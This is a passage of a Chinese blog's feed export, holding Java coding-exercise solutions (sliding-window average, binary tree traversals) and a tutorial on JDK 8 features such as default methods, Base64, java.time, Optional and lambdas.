href="#12-拼接最大数" class="headerlink" title="12. 拼接最大数"></a>12. 拼接最大数</h3><h3 id="13-132模式"><a href="#13-132模式" class="headerlink" title="13. 132模式"></a>13. 132模式</h3><h3 id="14-翻转字符串里的单词"><a href="#14-翻转字符串里的单词" class="headerlink" title="14. 翻转字符串里的单词"></a>14. 翻转字符串里的单词</h3><h2 id="刷题第十一天"><a href="#刷题第十一天" class="headerlink" title="刷题第十一天"></a>刷题第十一天</h2><h2 id="刷题第十二天"><a href="#刷题第十二天" class="headerlink" title="刷题第十二天"></a>刷题第十二天</h2><h3 id="1-子数组最大平均数I"><a href="#1-子数组最大平均数I" class="headerlink" title="1. 子数组最大平均数I"></a>1. 子数组最大平均数I</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">findMaxAverage</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> n = nums.length;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; k; i++) &#123;</span><br><span class="line">            sum += nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> maxSum = sum;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = k; i &lt; n; i++) &#123;</span><br><span class="line">            sum = sum - nums[i - k] + nums[i];</span><br><span class="line">            maxSum = Math.max(maxSum, sum);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1.0</span> * maxSum / k;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="刷题第十六天"><a href="#刷题第十六天" class="headerlink" title="刷题第十六天"></a>刷题第十六天</h2><h3 id="1-前序遍历"><a href="#1-前序遍历" class="headerlink" title="1. 前序遍历"></a>1. 前序遍历</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 递归解法</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">preorderTraversal</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    ArrayList&lt;Integer&gt; res = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="keyword">if</span> (root ==<span class="keyword">null</span>) <span class="keyword">return</span> res;</span><br><span class="line">    preOrder(root, res);</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">preOrder</span><span class="params">(TreeNode node, List&lt;Integer&gt; res)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (node == <span class="keyword">null</span>) <span class="keyword">return</span>;</span><br><span class="line">    <span class="comment">// 处理当前遍历的节点</span></span><br><span class="line">    res.add(node.val);</span><br><span class="line">    preOrder(node.left, res);</span><br><span class="line">    preOrder(node.right, res);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-中序遍历"><a href="#2-中序遍历" class="headerlink" title="2. 中序遍历"></a>2. 中序遍历</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 递归解法</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">inOrderTraversal</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    List&lt;Integer&gt; res = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="keyword">if</span> (root ==<span class="keyword">null</span>) <span class="keyword">return</span> res;</span><br><span class="line">    inOrder(root, res);</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">inOrder</span><span class="params">(TreeNode node, List&lt;Integer&gt; res)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (node == <span class="keyword">null</span>) <span class="keyword">return</span>;</span><br><span class="line">    inOrder(node.left, res);</span><br><span class="line">    res.add(node.val);</span><br><span class="line">    inOrder(node.right, res);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-后序遍历"><a href="#3-后序遍历" class="headerlink" title="3. 后序遍历"></a>3. 后序遍历</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment">// 递归解法</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">postorderTraversal</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    List&lt;Integer&gt; res = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="keyword">if</span> (root ==<span class="keyword">null</span>) <span class="keyword">return</span> res;</span><br><span class="line">    postorder(root, res);</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">postorder</span><span class="params">(TreeNode node, List&lt;Integer&gt; res)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (node == <span class="keyword">null</span>) <span class="keyword">return</span>;</span><br><span class="line">    postorder(node.left, res);</span><br><span class="line">    postorder(node.right, res);</span><br><span class="line">    res.add(node.val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-前序遍历实现层序遍历"><a href="#4-前序遍历实现层序遍历" class="headerlink" title="4. 前序遍历实现层序遍历"></a>4. 前序遍历实现层序遍历</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 前序遍历(递归)实现层序遍历</span></span><br><span class="line"><span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; levelOrder(TreeNode root)&#123;</span><br><span class="line">    List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    preOrder(root, <span class="number">0</span>, res);</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">preOrder</span><span class="params">(TreeNode node, <span class="keyword">int</span> currLevel, List&lt;List&lt;Integer&gt;&gt; res)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(node == <span class="keyword">null</span>) <span class="keyword">return</span>;</span><br><span class="line">    <span class="comment">// 处理当前遍历的节点</span></span><br><span class="line">    <span class="keyword">if</span>(res.size() == currLevel)&#123;</span><br><span class="line">        List&lt;Integer&gt; levelNodes = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        levelNodes.add(node.val);</span><br><span class="line">        res.add(levelNodes);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        res.get(currLevel).add(node.val);</span><br><span class="line">    &#125;</span><br><span class="line">    preOrder(node.left, currLevel + <span class="number">1</span>, res);</span><br><span class="line">    preOrder(node.right, currLevel + <span class="number">1</span>, res);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;面试题&quot;&gt;&lt;a href=&quot;#面试题&quot; class=&quot;headerlink&quot; title=&quot;面试题&quot;&gt;&lt;/a&gt;面试题&lt;/h1&gt;&lt;h2 id=&quot;简单题&quot;&gt;&lt;a href=&quot;#简单题&quot; class=&quot;headerlink&quot; title=&quot;简单题&quot;&gt;&lt;/a&gt;简单题&lt;/h
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>JDK8~13新特性</title>
    <link href="https://blog.kaluna.top/2021/06/30/JDK8-13%E6%96%B0%E7%89%B9%E6%80%A7/"/>
    <id>https://blog.kaluna.top/2021/06/30/JDK8-13%E6%96%B0%E7%89%B9%E6%80%A7/</id>
    <published>2021-06-30T12:33:07.482Z</published>
    <updated>2021-07-01T07:25:55.124Z</updated>
    
    <content type="html"><![CDATA[<h1 id="JDK8新特性之接⼝和⽇期处理"><a href="#JDK8新特性之接⼝和⽇期处理" class="headerlink" title="JDK8新特性之接⼝和⽇期处理"></a>JDK8新特性之接⼝和⽇期处理</h1><h2 id="JDK8之default关键字"><a href="#JDK8之default关键字" class="headerlink" title="JDK8之default关键字"></a>JDK8之default关键字</h2><p>在jdk1.8以前接⼝⾥⾯是只能有抽象⽅法，不能有任何⽅法的实现的，jdk1.8⾥⾯打破了这个规定，引⼊了新的关键字default，使⽤default修饰⽅法，可以在接⼝⾥⾯ 定义具体的⽅法实</p><ul><li>默认⽅法： 接⼝⾥⾯定义⼀个默认⽅法，这个接⼝的实现类实现了这个接⼝之后，这个 default修饰的⽅法就可以直接调⽤，即接⼝⽅法的默认实现</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line"> <span class="function"><span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>;</span><br><span class="line"> <span class="function"><span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span></span>;</span><br><span class="line"> <span class="function"><span class="keyword">default</span> <span class="keyword">void</span> <span class="title">breath</span><span class="params">()</span></span>&#123;</span><br><span class="line"> System.out.println(<span class="string">"使⽤氧⽓呼吸"</span>);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>静态⽅法：接⼝名.静态⽅法来访问接⼝中的静态⽅法</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line"> <span class="function"><span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>;</span><br><span class="line"> <span class="function"><span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span></span>;</span><br><span class="line"> <span class="function"><span class="keyword">default</span> <span class="keyword">void</span> <span class="title">breath</span><span class="params">()</span></span>&#123;</span><br><span class="line"> System.out.println(<span class="string">"使⽤氧⽓呼吸"</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">System.out.println(<span class="string">"这是静态⽅法"</span>);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="jdk1-8之新增Base64加解密API"><a href="#jdk1-8之新增Base64加解密API" class="headerlink" title="jdk1.8之新增Base64加解密API"></a>jdk1.8之新增Base64加解密API</h2><p>什么是Base64编码？</p><p>Base64是⽹络上最常⻅的⽤于传输8Bit字节码的编码⽅式之⼀，Base64就是⼀种基于64个可打印字符来表示⼆进制数据的⽅法 基于64个字符A-Z,a-z，0-9，+，/的编码⽅式， 是⼀种能将任意⼆进制数据⽤64种字元组合成字符串的⽅法，⽽这个⼆进制数据和字符串资料之间是可以互相转换的，在实际应⽤上，Base64除了能将⼆进制数据可视化之外，也常⽤来表示字串加密过后的内容</p><p><strong>早期java要使⽤Base64怎么做？</strong></p><ul><li>使⽤JDK⾥sun.misc套件下的BASE64Encoder和BASE64Decoder这两个类</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">BASE64Encoder encoder = <span class="keyword">new</span> BASE64Encoder();</span><br><span class="line">BASE64Decoder decoder = <span class="keyword">new</span> BASE64Decoder();</span><br><span class="line">String text = <span class="string">"⼩滴课堂"</span>;</span><br><span class="line"><span class="keyword">byte</span>[] textByte = text.getBytes(<span class="string">"UTF-8"</span>);</span><br><span class="line"><span class="comment">//编码</span></span><br><span class="line">String encodedText = encoder.encode(textByte);</span><br><span class="line">System.out.println(encodedText);</span><br><span class="line"><span class="comment">//解码</span></span><br><span class="line">System.out.println(<span class="keyword">new</span> String(decoder.decodeBuffer(encodedText), <span class="string">"UTF-8"</span>));</span><br></pre></td></tr></table></figure><p>缺点：编码和解码的效率⽐较差，公开信息说以后的版本会取消这个⽅法</p><ul><li>Apache Commons Codec有提供Base64的编码与解码 缺点：是需要引⽤Apache Commons Codec</li></ul><p><strong>jdk1.8之后怎么玩？</strong>(⾸选推荐) </p><ul><li>Jdk1.8的java.util包中，新增了Base64的类 </li><li>好处：不⽤引包，编解码销量远⼤于 sun.misc 和 Apache Commons Codec</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Base64.Decoder decoder = Base64.getDecoder();</span><br><span class="line">Base64.Encoder encoder = Base64.getEncoder();</span><br><span class="line">String text = <span class="string">"⼩滴课堂"</span>;</span><br><span class="line"><span class="keyword">byte</span>[] textByte = text.getBytes(<span class="string">"UTF-8"</span>);</span><br><span class="line"><span class="comment">//编码</span></span><br><span class="line">String encodedText = encoder.encodeToString(textByte);</span><br><span class="line">System.out.println(encodedText);</span><br><span class="line"><span class="comment">//解码</span></span><br><span class="line">System.out.println(<span class="keyword">new</span> String(decoder.decode(encodedText), <span class="string">"UTF-8"</span>));</span><br></pre></td></tr></table></figure><h2 id="JDK8之时间⽇期处理类"><a href="#JDK8之时间⽇期处理类" class="headerlink" title="JDK8之时间⽇期处理类"></a>JDK8之时间⽇期处理类</h2><p>时间处理再熟悉不过，SimpleDateFormat，Calendar等类。旧版缺点： java.util.Date 是⾮线程安全的，API设计⽐较差，⽇期/时间对象⽐较，加减麻烦 </p><p>Java 8通过发布新的Date-Time API (JSR 310)来进⼀步加强对⽇期与时间的处理 新增了很多常⻅的api，如⽇期/时间的⽐较，加减，格式化等，包所在位置：<strong>java.time</strong> </p><p><strong>核⼼类</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">LocalDate：不包含具体时间的⽇期。</span><br><span class="line">LocalTime：不含⽇期的时间。</span><br><span class="line">LocalDateTime：包含了⽇期及时间。</span><br></pre></td></tr></table></figure><ul><li>LocalDate 常⽤API</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">LocalDate today = LocalDate.now();</span><br><span class="line">System.out.println(<span class="string">"今天⽇期："</span> + today);</span><br><span class="line"><span class="comment">//获取年，⽉，⽇，周⼏</span></span><br><span class="line">System.out.println(<span class="string">"现在是哪年:"</span>+today.getYear());</span><br><span class="line">System.out.println(<span class="string">"现在是哪⽉:"</span>+today.getMonth());</span><br><span class="line">System.out.println(<span class="string">"现在是哪⽉(数字):"</span>+today.getMonthValue());</span><br><span class="line">System.out.println(<span class="string">"现在是⼏号:"</span>+today.getDayOfMonth());</span><br><span class="line">System.out.println(<span class="string">"现在是周⼏:"</span>+today.getDayOfWeek());</span><br><span class="line"><span class="comment">//加减年份, 加后返回的对象才是修改后的， 旧的依旧是旧的</span></span><br><span class="line">LocalDate changeDate = today.plusYears(<span class="number">1</span>);</span><br><span class="line">System.out.println(<span class="string">"加后是哪年:"</span>+changeDate.getYear());</span><br><span class="line">System.out.println(<span class="string">"旧的是哪年:"</span>+today.getYear());</span><br><span class="line"><span class="comment">//⽇期⽐较</span></span><br><span class="line">System.out.println(<span class="string">"isAfter: "</span>+changeDate.isAfter(today));</span><br><span class="line"><span class="comment">//getYear() int 获取当前⽇期的年份</span></span><br><span class="line"><span class="comment">//getMonth() Month 获取当前⽇期的⽉份对象</span></span><br><span class="line"><span class="comment">//getMonthValue() int 获取当前⽇期是第⼏⽉</span></span><br><span class="line"><span class="comment">//getDayOfWeek() DayOfWeek 表示该对象表示的⽇期是星期⼏</span></span><br><span class="line"><span class="comment">//getDayOfMonth() int 表示该对象表示的⽇期是这个⽉第⼏天</span></span><br><span class="line"><span class="comment">//getDayOfYear() int 表示该对象表示的⽇期是今年第⼏天</span></span><br><span class="line"><span class="comment">//withYear(int year) LocalDate 修改当前对象的年份</span></span><br><span class="line"><span class="comment">//withMonth(int month) LocalDate 修改当前对象的⽉份</span></span><br><span class="line"><span class="comment">//withDayOfMonth(int dayOfMonth) LocalDate 修改当前对象在当⽉的⽇期</span></span><br><span class="line"><span class="comment">//plusYears(long yearsToAdd) LocalDate 当前对象增加指定的年份数</span></span><br><span class="line"><span class="comment">//plusMonths(long monthsToAdd) LocalDate 当前对象增加指定的⽉份数</span></span><br><span class="line"><span class="comment">//plusWeeks(long weeksToAdd) LocalDate 当前对象增加指定的周数</span></span><br><span class="line"><span class="comment">//plusDays(long daysToAdd) LocalDate 当前对象增加指定的天数</span></span><br><span class="line"><span class="comment">//minusYears(long yearsToSubtract) LocalDate 当前对象减去指定的年数</span></span><br><span class="line"><span class="comment">//minusMonths(long monthsToSubtract) LocalDate 当前对象减去注定的⽉数</span></span><br><span class="line"><span class="comment">//minusWeeks(long weeksToSubtract) LocalDate 当前对象减去指定的周数</span></span><br><span class="line"><span class="comment">//minusDays(long daysToSubtract) LocalDate 当前对象减去指定的天数</span></span><br><span class="line"><span class="comment">//compareTo(ChronoLocalDate other) int ⽐较当前对象和other对象在时间上的⼤⼩，返回值如果为正，则当前对象时间较晚，</span></span><br><span class="line"><span class="comment">//isBefore(ChronoLocalDate other) boolean ⽐较当前对象⽇期是否在other对象⽇期之前</span></span><br><span class="line"><span class="comment">//isAfter(ChronoLocalDate other) boolean ⽐较当前对象⽇期是否在other对象⽇期之后</span></span><br><span class="line"><span class="comment">//isEqual(ChronoLocalDate other) boolean ⽐较两个⽇期对象是否相等</span></span><br></pre></td></tr></table></figure><ul><li>LocalTime 常⽤API </li><li>LocalDateTime 常⽤API</li></ul><p><strong>⽇期时间格式化</strong> </p><ul><li>JDK8之前：SimpleDateFormat来进⾏格式化，但SimpleDateFormat并不是线程安全的</li><li>JDK8之后：引⼊线程安全的DateTimeFormatter</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">LocalDateTime ldt = LocalDateTime.now();</span><br><span class="line">System.out.println(ldt);</span><br><span class="line">DateTimeFormatter dtf = DateTimeFormatter.ofPattern(<span class="string">"yyyy-MM-dd HH:mm:ss"</span>);</span><br><span class="line">String ldtStr = dtf.format(ldt);</span><br><span class="line">System.out.println(ldtStr);</span><br></pre></td></tr></table></figure><p><strong>获取指定的⽇期时间对象</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LocalDateTime ldt = LocalDateTime.of(<span class="number">2020</span>, <span class="number">11</span>, <span class="number">11</span>, <span class="number">8</span>, <span class="number">20</span>, <span class="number">30</span>);</span><br><span class="line">System.out.println(ldt);</span><br></pre></td></tr></table></figure><p><strong>计算⽇期时间差 java.time.Duration</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">LocalDateTime today = LocalDateTime.now();</span><br><span class="line">System.out.println(today);</span><br><span class="line">LocalDateTime changeDate = LocalDateTime.of(<span class="number">2020</span>,<span class="number">10</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">40</span>,<span class="number">30</span>);</span><br><span class="line">System.out.println(changeDate);</span><br><span class="line">Duration duration = Duration.between( today,changeDate);<span class="comment">//第⼆个参数减第⼀个参数</span></span><br><span class="line">System.out.println(duration.toDays());<span class="comment">//两个时间差的天数</span></span><br><span class="line">System.out.println(duration.toHours());<span class="comment">//两个时间差的⼩时数</span></span><br><span class="line">System.out.println(duration.toMinutes());<span class="comment">//两个时间差的分钟数</span></span><br><span class="line">System.out.println(duration.toMillis());<span class="comment">//两个时间差的毫秒数</span></span><br><span class="line">System.out.println(duration.toNanos());<span class="comment">//两个时间差的纳秒数</span></span><br></pre></td></tr></table></figure><h2 id="JDK8之Optional类"><a href="#JDK8之Optional类" class="headerlink" title="JDK8之Optional类"></a>JDK8之Optional类</h2><p><strong>Optional 类有啥⽤?</strong></p><ul><li>主要解决的问题是空指针异常（NullPointerException） </li><li>怎么解决？ 本质是⼀个包含有可选值的包装类，这意味着 Optional 类既可以含有对象也可以为空 </li></ul><p><strong>创建Optional类</strong> </p><p>of() </p><ul><li>null 值作为参数传递进去则会抛异常</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Optional&lt;Student&gt; opt = Optional.of(user);</span><br></pre></td></tr></table></figure><p>ofNullable()</p><ul><li>如果对象即可能是 null 也可能是⾮ null，应该使⽤ ofNullable() ⽅法</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Optional&lt;Student&gt; opt = Optional.ofNullable(user);</span><br></pre></td></tr></table></figure><p><strong>访问 Optional 对象的值</strong></p><p>get() ⽅法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Optional&lt;Student&gt; opt = Optional.ofNullable(student);</span><br><span class="line">Student s = opt.get();</span><br></pre></td></tr></table></figure><p>如果值存在则isPresent()⽅法会返回true，调⽤get()⽅法会返回该对象，⼀般使⽤get之前需要先验证是否有值，不然还会报错</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    Student student = <span class="keyword">null</span>;</span><br><span class="line">    test(student);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">(Student student)</span></span>&#123;</span><br><span class="line">    Optional&lt;Student&gt; opt = Optional.ofNullable(student);</span><br><span class="line">    System.out.println(opt.isPresent());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>兜底 orElse⽅法 </p><ul><li>orElse()如果有值则返回该值，否则返回传递给它的参数值</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Student student1 = <span class="keyword">null</span>;</span><br><span class="line">Student student2 = <span class="keyword">new</span> Student(<span class="number">2</span>);</span><br><span class="line">Student result = Optional.ofNullable(student1).orElse(student2);</span><br><span class="line">System.out.println(result.getAge());</span><br><span class="line"></span><br><span class="line">Student student = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">int</span> result = Optional.ofNullable(student).map(obj-&gt;obj.getAge()).orElse(<span class="number">4</span>);</span><br><span class="line">System.out.println(result);</span><br></pre></td></tr></table></figure><h1 id="JDK8-Lambda表达式"><a href="#JDK8-Lambda表达式" class="headerlink" title="JDK8 Lambda表达式"></a>JDK8 Lambda表达式</h1><h2 id="JDK8之-lambda表达式"><a href="#JDK8之-lambda表达式" class="headerlink" title="JDK8之 lambda表达式"></a>JDK8之 lambda表达式</h2><p><strong>什么是函数式编程和什么是lambda表达式</strong></p><p>在JDK8之前，Java是不⽀持函数式编程的，所谓的函数编程，即可理解是将⼀个函数（也称为“⾏为”）作为⼀个参数进⾏传递， ⾯向对象编程是对数据的抽象（各种各样的POJO类），⽽函数式编程则是对⾏为的抽象（将⾏为作为⼀个参数进⾏传递）</p><p><strong>java创建线程再熟悉不过了</strong></p><ul><li><p>jdk8之前创建线程</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"⼩滴课堂学习Java架构教程"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;);</span><br></pre></td></tr></table></figure></li><li><p>jdk8之后Lambda表达式则只需要使⽤⼀句话</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> Thread(() -&gt; System.out.println(<span class="string">"⼩滴课堂学习Java架构教程"</span>));</span><br></pre></td></tr></table></figure></li></ul><p><strong>集合容器⾥⾯的字符串排序</strong> </p><ul><li><p>使⽤前</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">List&lt;String&gt; list =Arrays.asList(<span class="string">"aaa"</span>,<span class="string">"ggg"</span>,<span class="string">"ffff"</span>,<span class="string">"ccc"</span>);</span><br><span class="line">Collections.sort(list, <span class="keyword">new</span> Comparator&lt;String&gt;() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(String a, String b)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> b.compareTo(a);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">);</span><br><span class="line"><span class="keyword">for</span> (String string : list) &#123;</span><br><span class="line">    System.out.println(string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>使⽤后</p><figure class="highlight java"><table><tr><td 